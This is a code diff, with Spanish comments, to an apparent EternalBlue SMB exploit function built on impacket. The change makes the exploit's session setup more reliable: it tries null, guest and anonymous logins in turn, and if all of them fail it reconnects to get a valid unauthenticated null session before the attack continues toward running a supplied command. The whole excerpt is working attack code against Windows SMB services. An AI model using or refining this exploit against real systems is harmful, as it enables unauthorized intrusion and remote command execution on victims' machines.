@@ -805,13 +805,32 @@ def _eternalblue_exploit(target, port, cmd, timeout=60):
         console.print(f"  [red]✗ No se pudo conectar: {e}[/red]")
         return False
 
-    try:
-        conn.login('', '', maxBufferSize=4356)
-    except Exception as e:
-        # En algunos sistemas el login falla pero el exploit puede continuar
-        console.print(f"  [dim]Login nulo rechazado ({e}) — intentando continuar...[/dim]")
-
+    # Capturar OS antes del login (viene en la negociación SMB)
     server_os = conn.get_server_os()
+
+    login_ok = False
+    for user, passwd in [('', ''), ('guest', ''), ('anonymous', '')]:
+        try:
+            conn.login(user, passwd)
+            login_ok = True
+            break
+        except Exception:
+            pass
+
+    if not login_ok:
+        # Reconectar limpio: impacket deja el UID en estado inválido si login falla.
+        # Una nueva conexión sin intentar login deja la sesión en estado nulo válido.
+        try:
+            conn.get_socket().close()
+        except Exception:
+            pass
+        try:
+            conn = MYSMB(target, int(port), timeout=timeout)
+            conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        except Exception as e:
+            console.print(f"  [red]✗ No se pudo reconectar: {e}[/red]")
+            return False
+        console.print(f"  [dim]Sesión nula sin autenticación[/dim]")
     console.print(f"  [dim]SO detectado: {server_os}[/dim]")
 
     info = {}
